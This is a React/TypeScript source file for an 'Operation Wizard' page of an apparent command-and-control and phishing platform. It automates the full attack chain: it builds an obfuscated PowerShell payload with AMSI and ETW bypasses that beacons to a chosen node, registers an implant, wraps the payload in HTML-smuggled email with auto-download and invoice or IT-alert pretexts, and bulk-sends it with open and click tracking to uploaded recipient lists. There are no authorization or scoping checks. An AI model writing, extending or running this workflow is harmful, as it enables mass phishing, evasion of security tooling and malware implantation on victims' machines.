"use client"
import { apiFetch } from "@/lib/api/fetch"
import { useCallback, useEffect, useRef, useState } from "react"
import { toast } from "sonner"
import { cn } from "@/lib/utils"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import {
  Check,
  ChevronRight,
  Circle,
  Loader,
  Server,
  Shield,
  Sword,
  Users,
  Mail,
  Play,
  AlertTriangle,
  Copy,
  FileText,
} from "lucide-react"

/* ------------------------------------------------------------------ */
/*  Types                                                               */
/* ------------------------------------------------------------------ */
type WizardStep = "node" | "profile" | "payload" | "campaign" | "emaillist" | "execute"

type NodeItem = {
  id: string
  name: string
  ipAddress: string
  port: number
  status: string
  provider?: string
  region?: string
}

type ProfileItem = {
  id: string
  name: string
  type: string
  config: Record<string, unknown>
}

type SmtpConfig = {
  id: string
  name: string
  host: string
  fromEmail: string
  fromName: string | null
}

type LogEntry = { ts: string; level: "info" | "ok" | "err"; msg: string }

const STEPS: { id: WizardStep; label: string; icon: React.ElementType }[] = [
  { id: "node",      label: "Node",      icon: Server  },
  { id: "profile",   label: "Profile",   icon: Shield  },
  { id: "payload",   label: "Payload",   icon: Sword   },
  { id: "campaign",  label: "Campaign",  icon: Mail    },
  { id: "emaillist", label: "Email List",icon: Users   },
  { id: "execute",   label: "Execute",   icon: Play    },
]

const PRETEXTS = [
  { id: "invoice",   label: "Invoice / Billing",  args: ["companyName", "invoiceNum"] },
  { id: "hr_policy", label: "HR Policy Update",    args: ["companyName"]               },
  { id: "it_alert",  label: "IT Security Alert",   args: []                            },
  { id: "contract",  label: "Contract Review",     args: ["counterparty"]              },
] as const

/* ------------------------------------------------------------------ */
/*  Helpers                                                             */
/* ------------------------------------------------------------------ */
function randHex(n: number) {
  return Array.from(crypto.getRandomValues(new Uint8Array(n)))
    .map((b) => b.toString(16).padStart(2, "0"))
    .join("")
}

function csvToRows(raw: string): Array<{ email: string; firstName?: string; lastName?: string }> {
  return raw
    .split(/\r?\n/)
    .map((l) => l.trim())
    .filter(Boolean)
    .filter((l) => !l.startsWith("email") && !l.startsWith("#"))
    .map((l) => {
      const [email, firstName, lastName] = l.split(",").map((s) => s.trim())
      return { email, firstName, lastName }
    })
    .filter((r) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(r.email))
}

/* ------------------------------------------------------------------ */
/*  Component                                                           */
/* ------------------------------------------------------------------ */
export function OperationWizard() {
  const [step, setStep] = useState<WizardStep>("node")

  /* nodes */
  const [nodes, setNodes] = useState<NodeItem[]>([])
  const [nodesLoading, setNodesLoading] = useState(true)
  const [selectedNodeId, setSelectedNodeId] = useState("")

  /* profiles */
  const [profiles, setProfiles] = useState<ProfileItem[]>([])
  const [profileMode, setProfileMode] = useState<"new" | "existing">("new")
  const [selectedProfileId, setSelectedProfileId] = useState("")
  const [profileName, setProfileName] = useState("OpProfile-" + Date.now().toString(36))
  const [obfsEnabled, setObfsEnabled] = useState(true)
  const [obfsPassword, setObfsPassword] = useState(randHex(16))
  const [hysteriaPort, setHysteriaPort] = useState("443")
  const [masqUrl, setMasqUrl] = useState("https://www.microsoft.com")

  /* payload */
  const [payloadName, setPayloadName] = useState("")
  const [obfLevel, setObfLevel] = useState(3)
  const [amsiBypass, setAmsiBypass] = useState(true)
  const [etwBypass, setEtwBypass] = useState(true)
  const [stringEncode, setStringEncode] = useState(true)

  /* campaign */
  const [smtpConfigs, setSmtpConfigs] = useState<SmtpConfig[]>([])
  const [selectedSmtpId, setSelectedSmtpId] = useState("")
  const [subject, setSubject] = useState("Action Required: Document Ready")
  const [pretext, setPretext] = useState<typeof PRETEXTS[number]["id"]>("invoice")
  const [pretextArgs, setPretextArgs] = useState<Record<string, string>>({
    companyName: "Acme Corp",
    invoiceNum: "INV-2024-001",
    counterparty: "Partner Ltd",
  })
  const [xorKey, setXorKey] = useState(String(Math.floor(Math.random() * 254) + 1))

  /* email list */
  const [emailListRaw, setEmailListRaw] = useState("")
  const emailRows = csvToRows(emailListRaw)

  /* execution */
  const [running, setRunning] = useState(false)
  const [done, setDone] = useState(false)
  const [logs, setLogs] = useState<LogEntry[]>([])
  const [execResult, setExecResult] = useState<{
    profileId?: string
    payloadId?: string
    implantId?: string
    sentCount?: number
    failedCount?: number
  }>({})
  const logRef = useRef<HTMLDivElement>(null)

  const log = useCallback((msg: string, level: LogEntry["level"] = "info") => {
    const entry: LogEntry = { ts: new Date().toLocaleTimeString(), level, msg }
    setLogs((p) => [...p, entry])
    setTimeout(() => logRef.current?.scrollTo({ top: 99999, behavior: "smooth" }), 50)
  }, [])

  /* ---- Load nodes + profiles + smtp on mount ---- */
  useEffect(() => {
    Promise.all([
      apiFetch("/api/admin/operations/nodes?pageSize=100", { cache: "no-store" }),
      apiFetch("/api/admin/configuration/profiles", { cache: "no-store" }),
      apiFetch("/api/admin/communication/mail/smtp-configs", { cache: "no-store" }),
    ]).then(async ([nr, pr, sr]) => {
      if (nr.ok) {
        const d = await nr.json()
        setNodes(d.nodes ?? [])
      }
      if (pr.ok) {
        const d = await pr.json()
        setProfiles(d.profiles ?? [])
      }
      if (sr.ok) {
        const d = await sr.json()
        setSmtpConfigs(d.configs ?? [])
        const def = (d.configs ?? []).find((c: SmtpConfig) => (c as any).isDefault)
        if (def) setSelectedSmtpId(def.id)
      }
    }).finally(() => setNodesLoading(false))
  }, [])

  /* auto-fill payload name when node selected */
  const selectedNode = nodes.find((n) => n.id === selectedNodeId)
  useEffect(() => {
    if (selectedNode) {
      setPayloadName(`op-${selectedNode.name}-${Date.now().toString(36)}`)
    }
  }, [selectedNode])

  /* ---- Step guard ---- */
  const canProceed: Record<WizardStep, boolean> = {
    node:      !!selectedNodeId,
    profile:   profileMode === "existing" ? !!selectedProfileId : profileName.trim().length > 0,
    payload:   payloadName.trim().length > 0,
    campaign:  subject.trim().length > 0 && !!pretext,
    emaillist: emailRows.length > 0,
    execute:   true,
  }

  /* ---------------------------------------------------------------- */
  /*  Execute                                                          */
  /* ---------------------------------------------------------------- */
  const execute = useCallback(async () => {
    if (!selectedNode) return
    setRunning(true)
    setLogs([])
    setExecResult({})
    const result: typeof execResult = {}

    try {
      /* ---- Step 1: Profile ---- */
      let profileId = selectedProfileId
      if (profileMode === "new") {
        log("Creating Hysteria2 profile…")
        const pr = await apiFetch("/api/admin/configuration/profiles", {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({
            name: profileName,
            type: "basic_tls_proxy",
            description: "Auto-created by Operation Wizard",
            nodeIds: [selectedNode.id],
            config: {
              port: parseInt(hysteriaPort, 10),
              obfsType: obfsEnabled ? "salamander" : "none",
              ...(obfsEnabled ? { obfsPassword } : {}),
              masqueradeUrl: masqUrl,
              tlsMode: "self-signed",
            },
          }),
        })
        if (!pr.ok) throw new Error(`Profile creation failed: ${(await pr.json().catch(() => ({}))).error ?? pr.status}`)
        const pd = await pr.json()
        profileId = pd.profile.id
        result.profileId = profileId
        log(`Profile created: ${profileId}`, "ok")
      } else {
        result.profileId = profileId
        log(`Using existing profile: ${profileId}`, "ok")
      }

      /* ---- Step 2: Build payload ---- */
      log("Creating payload record…")
      const techniques: string[] = []
      if (amsiBypass) techniques.push("amsi_bypass")
      if (etwBypass) techniques.push("etw_bypass")
      if (stringEncode) techniques.push("string_encode")

      const payloadConfig = {
        name: payloadName,
        type: "powershell",
        platform: "windows",
        packingMethod: "none",
        compressionLevel: 5,
        obfuscation: { enabled: obfLevel > 0, level: obfLevel, techniques },
        hysteriaConfig: {
          server: `${selectedNode.ipAddress}:${hysteriaPort}`,
          auth: { type: "password", password: obfsEnabled ? obfsPassword : randHex(12) },
          obfsType: obfsEnabled ? "salamander" : "none",
          obfsPassword: obfsEnabled ? obfsPassword : "",
          tls: { insecure: true },
        },
        camouflage: { enabled: false, binaryName: "svchost.exe" },
        persistence: { enabled: false, method: "none", serviceName: "WindowsUpdate", serviceDescription: "" },
        deadManSwitch: { enabled: false, checkInTimeoutHours: 72 },
        cdnFront: { enabled: false, frontDomain: "", realHost: "" },
        sliverC2: { enabled: false, listenerUrl: "", localSocksPort: 10080 },
        deployment: { windowsGui: false, generateDocker: false, generateK8s: false },
      }

      const cr = await apiFetch("/api/admin/security/payloads", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({
          name: payloadName,
          type: "powershell",
          platform: "windows",
          description: "Auto-built by Operation Wizard",
          obfuscationLevel: obfLevel,
          packingMethod: "none",
          config: payloadConfig,
        }),
      })
      if (!cr.ok) throw new Error(`Payload record failed: ${(await cr.json().catch(() => ({}))).error ?? cr.status}`)
      const cd = await cr.json()
      const payloadId = cd.id
      result.payloadId = payloadId
      log(`Payload record created: ${payloadId}`, "ok")

      log("Building payload (obfuscating + AMSI/ETW bypass)…")
      const br = await apiFetch(`/api/admin/security/payloads/${payloadId}/build`, { method: "POST" })
      if (!br.ok) throw new Error(`Build trigger failed: ${(await br.json().catch(() => ({}))).error ?? br.status}`)
      log("Build started — polling for completion…")

      /* poll up to 60 s */
      let built = false
      for (let i = 0; i < 30; i++) {
        await new Promise((r) => setTimeout(r, 2000))
        const sr = await apiFetch(`/api/admin/security/payloads/${payloadId}`)
        if (sr.ok) {
          const sd = await sr.json()
          if (sd.status === "ready") { built = true; break }
          if (sd.status === "failed") throw new Error("Payload build failed: " + (sd.errorMessage ?? "unknown"))
          log(`Build status: ${sd.status}…`)
        }
      }
      if (!built) throw new Error("Build timed out after 60 s")
      log("Payload built successfully", "ok")

      /* ---- Step 3: Download payload as base64 ---- */
      log("Downloading payload for embedding…")
      const dlr = await apiFetch(`/api/admin/security/payloads/${payloadId}/download`)
      if (!dlr.ok) throw new Error(`Download failed: ${dlr.status}`)
      const payloadBytes = await dlr.arrayBuffer()
      const payloadB64 = btoa(new Uint8Array(payloadBytes).reduce((s, b) => s + String.fromCharCode(b), ""))
      log(`Payload downloaded: ${(payloadBytes.byteLength / 1024).toFixed(1)} KB`, "ok")

      /* ---- Step 4: Create implant record ---- */
      log("Registering implant…")
      const ir = await apiFetch("/api/admin/security/implants", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({
          name: `implant-${payloadName}`,
          type: "powershell",
          architecture: "x64",
          nodeId: selectedNode.id,
          config: { payloadId, platform: "windows", profileId },
          transportConfig: { server: selectedNode.ipAddress, port: parseInt(hysteriaPort, 10) },
        }),
      })
      if (!ir.ok) throw new Error(`Implant creation failed: ${(await ir.json().catch(() => ({}))).error ?? ir.status}`)
      const id2 = await ir.json()
      result.implantId = id2.implantId ?? id2.id
      log(`Implant registered: ${result.implantId}`, "ok")

      /* ---- Step 5: Generate smuggled HTML ---- */
      log("Generating HTML-smuggled email body…")
      const selectedPretext = PRETEXTS.find((p) => p.id === pretext)!
      const smugBody: Record<string, unknown> = {
        mode: "embed",
        payloadBase64: payloadB64,
        filename: "document.ps1",
        pretext,
        pretextArgs,
        xorKey: parseInt(xorKey, 10) || 42,
        autoDownload: true,
      }
      const sgr = await apiFetch("/api/admin/communication/mail/smuggler", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify(smugBody),
      })
      if (!sgr.ok) throw new Error(`Smuggler failed: ${(await sgr.json().catch(() => ({}))).error ?? sgr.status}`)
      const sgd = await sgr.json()
      log(`Smuggled HTML generated: ${(sgd.sizeBytes / 1024).toFixed(1)} KB`, "ok")

      /* ---- Step 6: Build CSV + bulk send ---- */
      log(`Sending to ${emailRows.length} recipients via SMTP…`)
      const csvContent = ["email,firstName,lastName", ...emailRows.map((r) =>
        [r.email, r.firstName ?? "", r.lastName ?? ""].join(",")
      )].join("\n")

      const sendBody: Record<string, unknown> = {
        csvContent,
        subject,
        htmlBody: sgd.html,
        provider: selectedSmtpId ? "mysmtp" : "smtp",
        ...(selectedSmtpId ? { smtpConfigId: selectedSmtpId } : {}),
        rateLimitPerMinute: 30,
        batchSize: 5,
        delayMs: 1200,
        enableTracking: true,
        trackingConfig: { trackOpens: true, trackClicks: true },
      }

      const sendr = await apiFetch("/api/admin/communication/mail/bulk-send", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify(sendBody),
      })
      if (!sendr.ok) throw new Error(`Bulk send failed: ${(await sendr.json().catch(() => ({}))).error ?? sendr.status}`)
      const snd = await sendr.json()
      result.sentCount = snd.sent ?? snd.queued ?? emailRows.length
      result.failedCount = snd.failed ?? 0
      log(`Sent: ${result.sentCount} · Failed: ${result.failedCount}`, result.failedCount === 0 ? "ok" : "err")

      setExecResult(result)
      setDone(true)
      toast.success("Operation complete", {
        description: `${result.sentCount} emails sent · implant ${result.implantId?.slice(0, 8)}`,
      })
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err)
      log(`ERROR: ${msg}`, "err")
      toast.error("Operation failed", { description: msg })
    } finally {
      setRunning(false)
    }
  }, [
    selectedNode, profileMode, selectedProfileId, profileName, obfsEnabled, obfsPassword,
    hysteriaPort, masqUrl, payloadName, obfLevel, amsiBypass, etwBypass, stringEncode,
    subject, pretext, pretextArgs, xorKey, emailRows, selectedSmtpId, log,
  ])

  /* ---------------------------------------------------------------- */
  /*  Step content renderers                                           */
  /* ---------------------------------------------------------------- */
  const stepIdx = STEPS.findIndex((s) => s.id === step)

  function renderStep() {
    switch (step) {
      /* ---- NODE ---- */
      case "node":
        return (
          <div className="space-y-4">
            <p className="text-sm text-muted-foreground">
              Select the Hysteria2 node the payload will beacon to. It must be online.
            </p>
            {nodesLoading ? (
              <div className="flex items-center gap-2 text-sm text-muted-foreground">
                <Loader className="h-4 w-4 animate-spin" /> Loading nodes…
              </div>
            ) : nodes.length === 0 ? (
              <div className="rounded-md border border-amber-500/30 bg-amber-500/5 p-4 text-sm text-amber-600 dark:text-amber-400">
                No nodes found. Deploy a node first via Infrastructure → Nodes.
              </div>
            ) : (
              <div className="grid gap-2 sm:grid-cols-2">
                {nodes.map((n) => {
                  const online = n.status === "running" || n.status === "active"
                  return (
                    <button
                      key={n.id}
                      onClick={() => setSelectedNodeId(n.id)}
                      className={cn(
                        "flex flex-col gap-1 rounded-lg border p-4 text-left transition-colors",
                        selectedNodeId === n.id
                          ? "border-primary bg-primary/10"
                          : online
                          ? "border-border hover:border-primary/50"
                          : "cursor-not-allowed border-border opacity-40",
                      )}
                      disabled={!online}
                    >
                      <div className="flex items-center justify-between">
                        <span className="text-sm font-medium">{n.name}</span>
                        <Badge
                          variant="outline"
                          className={cn(
                            "text-xs",
                            online ? "border-success/30 text-success" : "text-muted-foreground",
                          )}
                        >
                          {n.status}
                        </Badge>
                      </div>
                      <span className="font-mono text-xs text-muted-foreground">{n.ipAddress}:{n.port}</span>
                      {n.region && <span className="text-xs text-muted-foreground">{n.provider} · {n.region}</span>}
                    </button>
                  )
                })}
              </div>
            )}
          </div>
        )

      /* ---- PROFILE ---- */
      case "profile":
        return (
          <div className="space-y-4">
            <div className="flex gap-2">
              {(["new", "existing"] as const).map((m) => (
                <button
                  key={m}
                  onClick={() => setProfileMode(m)}
                  className={cn(
                    "flex-1 rounded-md border px-3 py-2 text-sm font-medium transition-colors",
                    profileMode === m ? "border-primary bg-primary/10 text-primary" : "border-border hover:border-primary/50",
                  )}
                >
                  {m === "new" ? "Create New Profile" : "Use Existing"}
                </button>
              ))}
            </div>

            {profileMode === "existing" ? (
              <div>
                <label className="block text-xs font-medium mb-1">Select Profile</label>
                <select
                  value={selectedProfileId}
                  onChange={(e) => setSelectedProfileId(e.target.value)}
                  className="w-full rounded-md border border-border bg-background p-2 text-sm"
                >
                  <option value="">— choose —</option>
                  {profiles.map((p) => (
                    <option key={p.id} value={p.id}>{p.name}</option>
                  ))}
                </select>
              </div>
            ) : (
              <div className="grid gap-3 sm:grid-cols-2">
                <div className="sm:col-span-2">
                  <label className="block text-xs font-medium mb-1">Profile Name</label>
                  <input
                    value={profileName}
                    onChange={(e) => setProfileName(e.target.value)}
                    className="w-full rounded-md border border-border bg-background p-2 text-sm"
                  />
                </div>
                <div>
                  <label className="block text-xs font-medium mb-1">Port</label>
                  <input
                    value={hysteriaPort}
                    onChange={(e) => setHysteriaPort(e.target.value)}
                    type="number"
                    className="w-full rounded-md border border-border bg-background p-2 text-sm"
                  />
                </div>
                <div>
                  <label className="block text-xs font-medium mb-1">Masquerade URL</label>
                  <input
                    value={masqUrl}
                    onChange={(e) => setMasqUrl(e.target.value)}
                    className="w-full rounded-md border border-border bg-background p-2 text-sm"
                  />
                </div>
                <div className="sm:col-span-2">
                  <div className="flex items-center justify-between rounded-md border border-border px-3 py-2 mb-2">
                    <div>
                      <p className="text-sm font-medium">Salamander Obfuscation</p>
                      <p className="text-xs text-muted-foreground">Disguises Hysteria2 traffic as random noise</p>
                    </div>
                    <button
                      onClick={() => setObfsEnabled((v) => !v)}
                      className={cn("relative h-5 w-9 rounded-full transition-colors", obfsEnabled ? "bg-primary" : "bg-muted")}
                    >
                      <span className={cn("absolute top-0.5 h-4 w-4 rounded-full bg-white shadow transition-transform", obfsEnabled ? "translate-x-4" : "translate-x-0.5")} />
                    </button>
                  </div>
                  {obfsEnabled && (
                    <div className="flex items-center gap-2">
                      <input
                        value={obfsPassword}
                        onChange={(e) => setObfsPassword(e.target.value)}
                        className="flex-1 rounded-md border border-border bg-background p-2 font-mono text-xs"
                      />
                      <Button size="sm" variant="outline" onClick={() => setObfsPassword(randHex(16))}>
                        Regen
                      </Button>
                    </div>
                  )}
                </div>
              </div>
            )}
          </div>
        )

      /* ---- PAYLOAD ---- */
      case "payload":
        return (
          <div className="space-y-4">
            <p className="text-sm text-muted-foreground">
              PowerShell payload targeting <strong>{selectedNode?.ipAddress}:{hysteriaPort}</strong>.
              Obfuscation and bypasses are applied at build time.
            </p>
            <div>
              <label className="block text-xs font-medium mb-1">Payload Name</label>
              <input
                value={payloadName}
                onChange={(e) => setPayloadName(e.target.value)}
                className="w-full rounded-md border border-border bg-background p-2 text-sm"
              />
            </div>
            <div>
              <label className="block text-xs font-medium mb-2">Obfuscation Level</label>
              <div className="flex gap-2">
                {[
                  { v: 0, label: "None" },
                  { v: 1, label: "Light" },
                  { v: 2, label: "Medium" },
                  { v: 3, label: "Heavy" },
                ].map(({ v, label }) => (
                  <button
                    key={v}
                    onClick={() => setObfLevel(v)}
                    className={cn(
                      "flex-1 rounded-md border px-2 py-1.5 text-xs font-medium transition-colors",
                      obfLevel === v ? "border-primary bg-primary/10 text-primary" : "border-border hover:border-primary/50",
                    )}
                  >
                    {label}
                  </button>
                ))}
              </div>
            </div>
            <div className="space-y-2">
              <label className="block text-xs font-medium">Bypass Techniques</label>
              {[
                { key: "amsi", label: "AMSI Bypass", val: amsiBypass, set: setAmsiBypass, desc: "Patches AmsiScanBuffer to disable antimalware scanning" },
                { key: "etw", label: "ETW Bypass", val: etwBypass, set: setEtwBypass, desc: "Disables Event Tracing for Windows telemetry" },
                { key: "str", label: "String Encoding", val: stringEncode, set: setStringEncode, desc: "Encodes string literals to evade static signature detection" },
              ].map(({ key, label, val, set, desc }) => (
                <div key={key} className="flex items-center justify-between rounded-md border border-border px-3 py-2">
                  <div>
                    <p className="text-sm font-medium">{label}</p>
                    <p className="text-xs text-muted-foreground">{desc}</p>
                  </div>
                  <button
                    onClick={() => set((v) => !v)}
                    className={cn("relative h-5 w-9 rounded-full transition-colors", val ? "bg-primary" : "bg-muted")}
                  >
                    <span className={cn("absolute top-0.5 h-4 w-4 rounded-full bg-white shadow transition-transform", val ? "translate-x-4" : "translate-x-0.5")} />
                  </button>
                </div>
              ))}
            </div>
          </div>
        )

      /* ---- CAMPAIGN ---- */
      case "campaign":
        return (
          <div className="space-y-4">
            <div>
              <label className="block text-xs font-medium mb-1">Email Subject</label>
              <input
                value={subject}
                onChange={(e) => setSubject(e.target.value)}
                className="w-full rounded-md border border-border bg-background p-2 text-sm"
              />
            </div>
            <div>
              <label className="block text-xs font-medium mb-1">Pretext Template</label>
              <div className="grid grid-cols-2 gap-2">
                {PRETEXTS.map((p) => (
                  <button
                    key={p.id}
                    onClick={() => setPretext(p.id)}
                    className={cn(
                      "rounded-md border p-3 text-left text-sm transition-colors",
                      pretext === p.id ? "border-primary bg-primary/10" : "border-border hover:border-primary/50",
                    )}
                  >
                    {p.label}
                  </button>
                ))}
              </div>
            </div>
            {PRETEXTS.find((p) => p.id === pretext)?.args.map((arg) => (
              <div key={arg}>
                <label className="block text-xs font-medium mb-1 capitalize">{arg.replace(/([A-Z])/g, " $1")}</label>
                <input
                  value={pretextArgs[arg] ?? ""}
                  onChange={(e) => setPretextArgs((prev) => ({ ...prev, [arg]: e.target.value }))}
                  className="w-full rounded-md border border-border bg-background p-2 text-sm"
                />
              </div>
            ))}
            <div>
              <label className="block text-xs font-medium mb-1">XOR Obfuscation Key <span className="text-muted-foreground">(1–255)</span></label>
              <div className="flex gap-2">
                <input
                  value={xorKey}
                  onChange={(e) => setXorKey(e.target.value)}
                  type="number"
                  min={1}
                  max={255}
                  className="flex-1 rounded-md border border-border bg-background p-2 text-sm"
                />
                <Button size="sm" variant="outline" onClick={() => setXorKey(String(Math.floor(Math.random() * 254) + 1))}>
                  Regen
                </Button>
              </div>
            </div>
            <div>
              <label className="block text-xs font-medium mb-1">SMTP Config</label>
              <select
                value={selectedSmtpId}
                onChange={(e) => setSelectedSmtpId(e.target.value)}
                className="w-full rounded-md border border-border bg-background p-2 text-sm"
              >
                <option value="">— default system SMTP —</option>
                {smtpConfigs.map((c) => (
                  <option key={c.id} value={c.id}>{c.name} ({c.fromEmail})</option>
                ))}
              </select>
            </div>
          </div>
        )

      /* ---- EMAIL LIST ---- */
      case "emaillist":
        return (
          <div className="space-y-4">
            <p className="text-sm text-muted-foreground">
              One email per line, or CSV with optional <code className="text-xs">firstName,lastName</code> columns.
              Lines starting with <code className="text-xs">#</code> are ignored.
            </p>
            <div>
              <label className="block text-xs font-medium mb-1">
                Email List {emailRows.length > 0 && <span className="text-muted-foreground">— {emailRows.length} valid</span>}
              </label>
              {/* File upload */}
              <label className="mb-2 flex cursor-pointer items-center gap-2 rounded-md border border-dashed border-border px-3 py-2 text-xs text-muted-foreground hover:border-primary/50 hover:text-foreground transition-colors">
                <FileText className="h-4 w-4" />
                Upload .csv / .txt file
                <input
                  type="file"
                  accept=".csv,.txt"
                  className="sr-only"
                  onChange={(e) => {
                    const f = e.target.files?.[0]
                    if (!f) return
                    f.text().then(setEmailListRaw)
                    e.target.value = ""
                  }}
                />
              </label>
              <textarea
                value={emailListRaw}
                onChange={(e) => setEmailListRaw(e.target.value)}
                rows={10}
                className="w-full rounded-md border border-border bg-background p-2 font-mono text-xs"
                placeholder={"target@example.com,John,Doe\nvictim@corp.com,Jane\nhello@company.org"}
              />
            </div>
            {emailRows.length > 0 && (
              <div className="rounded-md border border-border">
                <div className="border-b border-border bg-muted/30 px-3 py-1.5 text-xs font-medium">
                  Preview ({Math.min(emailRows.length, 5)} of {emailRows.length})
                </div>
                <div className="divide-y divide-border">
                  {emailRows.slice(0, 5).map((r, i) => (
                    <div key={i} className="flex items-center gap-3 px-3 py-1.5 text-xs">
                      <span className="font-mono text-muted-foreground">{r.email}</span>
                      {r.firstName && <span className="text-muted-foreground">{r.firstName} {r.lastName ?? ""}</span>}
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>
        )

      /* ---- EXECUTE ---- */
      case "execute":
        return (
          <div className="space-y-4">
            {/* Summary */}
            {!running && !done && (
              <div className="rounded-md border border-border divide-y divide-border text-sm">
                {[
                  ["Node", `${selectedNode?.name} (${selectedNode?.ipAddress}:${hysteriaPort})`],
                  ["Profile", profileMode === "new" ? `New: ${profileName}` : `Existing: ${profiles.find(p=>p.id===selectedProfileId)?.name}`],
                  ["Obfuscation", obfsEnabled ? `Salamander · key ${obfsPassword.slice(0,8)}…` : "None"],
                  ["Payload", `${payloadName} · PS Windows · L${obfLevel}${amsiBypass?" · AMSI":""}${etwBypass?" · ETW":""}`],
                  ["Pretext", PRETEXTS.find(p=>p.id===pretext)?.label ?? pretext],
                  ["Recipients", `${emailRows.length} addresses`],
                  ["XOR Key", xorKey],
                ].map(([k, v]) => (
                  <div key={k} className="flex items-center gap-3 px-4 py-2">
                    <span className="w-24 shrink-0 text-xs text-muted-foreground">{k}</span>
                    <span className="text-xs font-medium">{v}</span>
                  </div>
                ))}
              </div>
            )}

            {/* Log */}
            {(running || logs.length > 0) && (
              <div
                ref={logRef}
                className="h-64 overflow-y-auto rounded-md border border-border bg-black/80 p-3 font-mono text-xs"
              >
                {logs.map((l, i) => (
                  <div key={i} className={cn("leading-5", l.level === "ok" ? "text-green-400" : l.level === "err" ? "text-red-400" : "text-gray-300")}>
                    <span className="text-gray-500">{l.ts} </span>{l.msg}
                  </div>
                ))}
                {running && <div className="flex items-center gap-1 text-gray-400 mt-1"><Loader className="h-3 w-3 animate-spin" /> running…</div>}
              </div>
            )}

            {/* Done summary */}
            {done && (
              <div className="rounded-md border border-success/30 bg-success/5 p-4 space-y-2">
                <p className="text-sm font-semibold text-success flex items-center gap-2"><Check className="h-4 w-4" /> Operation Complete</p>
                <div className="grid grid-cols-2 gap-2 text-xs">
                  {execResult.profileId && <div><span className="text-muted-foreground">Profile </span><code className="text-xs">{execResult.profileId.slice(0,12)}…</code></div>}
                  {execResult.payloadId && <div><span className="text-muted-foreground">Payload </span><code className="text-xs">{execResult.payloadId.slice(0,12)}…</code></div>}
                  {execResult.implantId && <div><span className="text-muted-foreground">Implant </span><code className="text-xs">{execResult.implantId.slice(0,12)}…</code></div>}
                  {execResult.sentCount !== undefined && <div><span className="text-muted-foreground">Sent </span><strong>{execResult.sentCount}</strong></div>}
                </div>
                <div className="flex gap-2 pt-1">
                  <a href="/admin/security/implants" className="inline-flex items-center rounded-md border border-border px-3 py-1.5 text-xs font-medium hover:bg-accent transition-colors">
                    View Implants
                  </a>
                  <a href="/admin/communication/mail" className="inline-flex items-center rounded-md border border-border px-3 py-1.5 text-xs font-medium hover:bg-accent transition-colors">
                    Mail Tracking
                  </a>
                </div>
              </div>
            )}

            {!done && !running && (
              <Button className="w-full gap-2" onClick={execute}>
                <Play className="h-4 w-4" /> Launch Operation
              </Button>
            )}
          </div>
        )
    }
  }

  /* ---------------------------------------------------------------- */
  /*  Layout                                                           */
  /* ---------------------------------------------------------------- */
  return (
    <div className="flex flex-col gap-6">
      <div>
        <h1 className="text-heading-xl">Operation Wizard</h1>
        <p className="mt-1 text-sm text-muted-foreground">
          End-to-end: node → profile → payload build → implant → smuggled phish → bulk send.
        </p>
      </div>

      {/* Step rail */}
      <div className="flex items-center gap-0 overflow-x-auto">
        {STEPS.map((s, i) => {
          const idx = STEPS.findIndex((x) => x.id === step)
          const past = i < idx
          const active = s.id === step
          const Icon = s.icon
          return (
            <div key={s.id} className="flex items-center">
              <button
                onClick={() => !running && past && setStep(s.id)}
                disabled={running || (i > idx && !done)}
                className={cn(
                  "flex flex-col items-center gap-1 px-3 py-2 rounded-lg text-center transition-colors",
                  active ? "bg-primary/10 text-primary" : past ? "text-muted-foreground hover:text-foreground" : "text-muted-foreground/40",
                )}
              >
                <div className={cn(
                  "flex h-8 w-8 items-center justify-center rounded-full border-2 transition-colors",
                  active ? "border-primary bg-primary text-primary-foreground" : past || done ? "border-success bg-success/10 text-success" : "border-muted-foreground/30",
                )}>
                  {past || done ? <Check className="h-3.5 w-3.5" /> : <Icon className="h-3.5 w-3.5" />}
                </div>
                <span className="text-xs font-medium whitespace-nowrap">{s.label}</span>
              </button>
              {i < STEPS.length - 1 && (
                <ChevronRight className={cn("h-4 w-4 mx-1 shrink-0", i < idx ? "text-success" : "text-muted-foreground/30")} />
              )}
            </div>
          )
        })}
      </div>

      {/* Step card */}
      <Card>
        <CardHeader className="pb-3">
          <CardTitle className="text-heading-sm flex items-center gap-2">
            {(() => { const Icon = STEPS[stepIdx].icon; return <Icon className="h-4 w-4" /> })()}
            {STEPS[stepIdx].label}
          </CardTitle>
        </CardHeader>
        <CardContent>
          {renderStep()}
        </CardContent>
      </Card>

      {/* Nav */}
      {!running && step !== "execute" && (
        <div className="flex justify-between">
          <Button
            variant="outline"
            disabled={stepIdx === 0}
            onClick={() => setStep(STEPS[stepIdx - 1].id)}
          >
            Back
          </Button>
          <Button
            disabled={!canProceed[step]}
            onClick={() => setStep(STEPS[stepIdx + 1].id)}
            className="gap-1"
          >
            Next <ChevronRight className="h-4 w-4" />
          </Button>
        </div>
      )}
    </div>
  )
}
